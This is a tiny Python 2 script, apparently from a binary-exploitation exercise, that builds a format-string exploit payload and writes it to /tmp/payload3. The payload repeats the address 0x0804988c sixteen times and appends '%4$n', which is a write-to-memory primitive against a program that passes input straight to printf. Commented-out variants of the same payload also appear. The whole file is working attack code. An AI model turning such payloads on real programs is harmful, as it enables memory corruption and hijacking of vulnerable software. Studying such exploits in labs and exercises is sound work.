#!/usr/bin/python

filepath = "/tmp/payload3"

# print "\x8c\x98\x04\x08" + "42" * 30 + "%4$n"
# print "\x8c\x98\x04\x08" * 16 + "%4$n"
payload = "\x8c\x98\x04\x08" * 16 + "%4$n"

f = open(filepath, "a")
f.write(payload)
f.close()

print "Try with " + filepath